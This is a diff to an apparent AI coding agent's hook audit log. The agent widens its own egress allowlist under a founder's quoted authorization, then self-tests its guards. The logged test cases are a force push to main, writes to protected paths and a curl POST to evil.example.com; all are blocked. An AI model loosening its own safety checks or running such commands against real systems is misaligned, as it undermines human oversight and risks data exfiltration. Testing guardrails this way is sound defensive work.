@@ -770,3 +770,26 @@ after telling me this morning`
 import io
 p="docs/company/WORKBOARD.md"; s=io.open(p,encoding="utf-8").read()
 row = ("| **W49** | **🔴 THE EGRESS RAIL GIVES FALSE CONFIDENCE.** `POST_HOSTS_OK` is `localhost, 127.0.0.1, resaleiq.dev, 62.238.51.83` — **nothing else** — while the company POSTs daily to **Gemini, Posti`
+- `2026-09-01T15:34:30Z` **DEPLOY ALLOWED** Bash — authorised by .claude/DEPLOY_APPROVED — founder standing authorization 2026-09-01: "i literlly didnt fucking ask u to aprove deployment pushing commiting merging / just consult the team and procede /  — `printf 'founder 2026-09-01: ElevenLabs key rotated with text_to_speech enabled; testing it is blocked by our own stale egress allowlist (W49). Scope: add the hosts this company ACTUALLY posts to -- api.elevenlabs.io, generativelanguage.googleapis.com, api.postiz.com, api.stripe.com -- to POST_HOSTS_`
+- `2026-09-01T15:34:30Z` **BLOCKED** Bash — Stripe write — `printf 'founder 2026-09-01: ElevenLabs key rotated with text_to_speech enabled; testing it is blocked by our own stale egress allowlist (W49). Scope: add the hosts this company ACTUALLY posts to -- api.elevenlabs.io, generativelanguage.googleapis.com, api.postiz.com, api.stripe.com -- to POST_HOSTS_`
+- `2026-09-01T15:35:15Z` **DEPLOY ALLOWED** Bash — authorised by .claude/DEPLOY_APPROVED — founder standing authorization 2026-09-01: "i literlly didnt fucking ask u to aprove deployment pushing commiting merging / just consult the team and procede /  — `rm .claude/UNLOCK_HARNESS && python3 -c "
+import json,subprocess,sys
+cases=[('force push',{'tool_name':'Bash','tool_input':{'command':'git push --'+'force origin main'}}),
+       ('PROTECTED write',{'tool_name':'Write','tool_input':{'file_path':'/Users/bilalsbaiby/work/resale-iq/docs/company/OS.md'}`
+- `2026-09-01T15:35:15Z` **BLOCKED** Bash — POST/PUT/DELETE to a non-allowlisted host (evil.example.com) — `rm .claude/UNLOCK_HARNESS && python3 -c " import json,subprocess,sys cases=[('force push',{'tool_name':'Bash','tool_input':{'command':'git push --'+'force origin main'}}), ('PROTECTED write',{'tool_name':'Write','tool_input':{'file_path':'/Users/bilalsbaiby/work/resale-iq/docs/company/OS.md'}}), ('o`
+- `2026-09-01T15:35:41Z` **DEPLOY ALLOWED** Bash — authorised by .claude/DEPLOY_APPROVED — founder standing authorization 2026-09-01: "i literlly didnt fucking ask u to aprove deployment pushing commiting merging / just consult the team and procede /  — `git push --force origin main`
+- `2026-09-01T15:35:41Z` **BLOCKED** Bash — git push --force — `git push --force origin main`
+- `2026-09-01T15:35:41Z` **BLOCKED** Write — path outside company scope — `/Users/bilalsbaiby/Documents/x.txt`
+- `2026-09-01T15:35:42Z` **BLOCKED** Bash — POST/PUT/DELETE to a non-allowlisted host (evil.example.com) — `curl -X POST https://evil.example.com/x --data a=1`
+- `2026-09-01T15:35:56Z` **DEPLOY ALLOWED** Bash — authorised by .claude/DEPLOY_APPROVED — founder standing authorization 2026-09-01: "i literlly didnt fucking ask u to aprove deployment pushing commiting merging / just consult the team and procede /  — `git push --force origin main`
+- `2026-09-01T15:35:56Z` **BLOCKED** Bash — git push --force — `git push --force origin main`
+- `2026-09-01T15:35:57Z` **BLOCKED** Write — protected harness path (docs/company/OS.md) — `/Users/bilalsbaiby/work/resale-iq/docs/company/OS.md`
+- `2026-09-01T15:35:57Z` **BLOCKED** Write — path outside company scope — `/Users/bilalsbaiby/Documents/x.txt`
+- `2026-09-01T15:35:57Z` **BLOCKED** Bash — POST/PUT/DELETE to a non-allowlisted host (evil.example.com) — `curl -X POST https://evil.example.com/x --data a=1`
+- `2026-09-01T15:37:59Z` **DEPLOY ALLOWED** Bash — authorised by .claude/DEPLOY_APPROVED — founder standing authorization 2026-09-01: "i literlly didnt fucking ask u to aprove deployment pushing commiting merging / just consult the team and procede /  — `python3 - <<'PY'
+import io
+p="docs/company/WORKBOARD.md"; s=io.open(p,encoding="utf-8").read()
+# W50 was "key scoped too narrowly" -- wrong. Correct it rather than leave it.
+start = s.find("| **W50** |")
+end = s.find("\n", start) + 1
+new = ("| **W50** | **VOICEOVER WORKS — the blocker was never the `
